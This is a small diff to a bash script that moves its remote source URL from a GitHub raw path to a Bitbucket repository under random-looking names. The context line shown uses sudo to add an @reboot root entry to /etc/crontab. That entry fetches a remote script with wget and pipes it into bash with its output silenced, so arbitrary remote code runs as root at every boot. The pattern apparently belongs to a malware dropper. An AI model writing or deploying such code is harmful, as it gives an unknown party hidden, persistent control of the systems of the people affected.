@@ -1,6 +1,6 @@
 #!/bin/bash
 
-src="https://raw.githubusercontent.com/vjbahkds/cajbdfv/main"
+src="https://bitbucket.org/kacepot/cajbdfv/raw/main"
 sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
